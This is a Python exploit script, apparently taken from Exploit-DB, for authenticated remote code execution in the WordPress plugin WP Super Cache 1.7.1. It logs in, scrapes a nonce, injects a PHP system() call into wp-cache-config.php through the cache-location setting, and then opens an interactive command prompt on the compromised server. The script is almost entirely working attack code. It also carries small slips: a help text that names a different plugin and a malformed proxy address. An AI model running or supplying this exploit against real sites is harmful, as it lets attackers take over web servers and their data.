import requests
import argparse
import re
from colorama import Fore, Back, Style

#Banner
banner = """
* WordPress Plugin WP Super Cache 1.7.1 - Remote Code Execution (Authenticated)                                                      
* https://www.exploit-db.com/exploits/49718
"""
print(banner)

#User provided arguments
my_parser = argparse.ArgumentParser(description='Wordpress Popular Posts plugin <= 5.3.2 - RCE (Authenticated)')
my_parser.add_argument('-t', help='--Target IP', metavar='IP', type=str, required=True, dest="target_ip")
my_parser.add_argument('-p', help='--Target port', type=str, metavar='PORT', default='80', dest="target_port")
my_parser.add_argument('-w', help='--Wordpress path (ie. /wordpress/)',metavar='PATH', type=str, required=True, dest="wp_path")
my_parser.add_argument('-U', help='--Username', metavar='USER', type=str, required=True, dest="username")
my_parser.add_argument('-P', help='--Password', metavar='PASS', type=str, required=True, dest="password")
args = my_parser.parse_args()
target_ip = args.target_ip
target_port = args.target_port
wp_path = args.wp_path
username = args.username
password = args.password

#Removing trailing / from WordPress path as that breaks some of the requests
if wp_path.endswith('/'):
        wp_path = wp_path[:-1]

print(Style.BRIGHT+Fore.GREEN + '[+] ' + Fore.RESET + 'Starting exploit')

#Proxy for debugging purposes - add proxies=proxies to the parameters of a GET/POST request to enable
proxies = {
 "http": "http://127.0.01:8080",
}
print(Style.BRIGHT+Fore.GREEN + '[+] ' + Fore.RESET + 'Authenticating as ' + username)

#Authentication URL
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + wp_path + '/wp-login.php'

#Headers
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
}

#Body
body = {
    'log': username,
    'pwd': password,
    'wp-submit': 'Log In',
    'testcookie': '1',
}

#Authentication request
auth = session.post(auth_url, headers=header, data=body)
auth_header = auth.headers['Set-Cookie']
if 'wordpress_logged_in' in auth_header:
    print(Style.BRIGHT+Fore.GREEN + '[+] ' + Fore.RESET + 'Authentication successful!')
else:
    print(Style.BRIGHT+Fore.RED + '[-] ' + Fore.RESET + 'Authentication failed ! Check username and password')
    exit()

#Verifying plugin version
print(Style.BRIGHT+Fore.GREEN + '[+] ' + Fore.RESET + 'Verifying WP Super Cache Plugin version...')
readme_url = 'http://' + target_ip + ':' + target_port + wp_path + '/wp-content/plugins/wp-super-cache-1.7.1/readme.txt'
readme = session.get(readme_url, verify=False)
if readme.status_code != 200 :
    print(Style.BRIGHT+Fore.RED + '[-] ' + Fore.RESET + 'Error, the site is not vulnerable!')
    exit()
else:
    print(Style.BRIGHT+Fore.GREEN + '[+] ' + Fore.RESET + 'The site appears to be vulnerable!')

#Retrieving _wpnonce
print(Style.BRIGHT+Fore.GREEN + '[+] ' + Fore.RESET + 'Retrieving _wpnonce parameter...')
_wponce_url = session.get('http://' + target_ip + ':' + target_port + wp_path + '/wp-admin/options-general.php?', verify=False)
wp_nonce_list = re.findall(r"wpnonce=(\w+)'",_wponce_url.text)
wp_nonce = wp_nonce_list[0]
if wp_nonce:
    print(Style.BRIGHT+Fore.GREEN + '[+] ' + Fore.RESET + 'Success! _wpnonce value is ' + wp_nonce)
else:
    print(Style.BRIGHT+Fore.RED + '[-] ' + Fore.RESET + 'Error while retrieving wp_nonce!')
    exit()

#Exploit URL
exploit_url = 'http://' + target_ip + ':' + target_port + wp_path + '/wp-admin/options-general.php?'

#Headers
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://' + target_ip + ':' + target_port + wp_path + '/wp-admin/options-general.php?page=wpsupercache&tab=settings',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

#Body
body = {
    '_wpnonce': wp_nonce,
    '_wp_http_referer': wp_path + '/blog/wp-admin/options-general.php?page=wpsupercache&tab=settings',
    'action':'scupdates',
    'wp_cache_mod_rewrite':'0',
    'wp_cache_not_logged_in':'0',
    'cache_rebuild_files':'1',
    'wp_cache_location':'\';system($_GET[rce]);include_once \\\'wp-cache-config.php\\\';\'',
}

#Parameters
params = (
    ('page', 'wpsupercache'),
    ('tab', 'settings'),
)

print(Style.BRIGHT+Fore.GREEN + '[+] ' + Fore.RESET + 'Creating wp-cache-config.php file...')
#First POST request to create the wp-cache-config.php file
exploit = session.post(exploit_url, headers=header, data=body, params=params, verify=False)
#Second POST request to add an additional line to the wp-cache-config.php file
exploit = session.post(exploit_url, headers=header, data=body, params=params, verify=False)

#Checking if the file has been created successfullly
test_url = 'http://' + target_ip + ':' + target_port + wp_path + '/wp-content/wp-cache-config.php?'
test_exploit = session.get(test_url, params=params, verify=False)
if test_exploit.status_code != 200 :
    print(Style.BRIGHT+Fore.RED + '[-] ' + Fore.RESET + 'There was an issue creating the file, do you have the right permissions to do so?')
    exit()
else:
    print(Style.BRIGHT+Fore.GREEN + '[+] ' + Fore.RESET + 'The file has been created!')
print(Style.BRIGHT+Fore.GREEN + '[+] ' + Fore.RESET + 'Success! Simply type commands in the prompt or type \'exit\' to quit!')
print('')

#Defining URL for remote code execution
rce_url = 'http://' + target_ip + ':' + target_port + wp_path + '/wp-content/wp-cache-config.php?'
pwd = session.get(rce_url, params={'rce':'pwd'}, verify=False).text.strip()
whoami = session.get(rce_url, params={'rce':'whoami'}, verify=False).text.strip()
hostname = session.get(rce_url, params={'rce':'hostname'}, verify=False).text.strip()
cli = Style.BRIGHT+Fore.RED + whoami + '@' + hostname + Fore.RESET + ':' + Style.BRIGHT+Fore.BLUE + pwd + Style.RESET_ALL + Fore.RESET
while True:
        cmd = input(cli + '$' + ' ')
        command = {'rce': cmd}
        rce = session.get(rce_url, params=command, verify=False)
        status = rce.status_code
        if status != 200:
            rce.raise_for_status()
        response2 = rce.text
        print(response2)
        if cmd == 'exit':
            print("\r\nExiting.")
            exit()
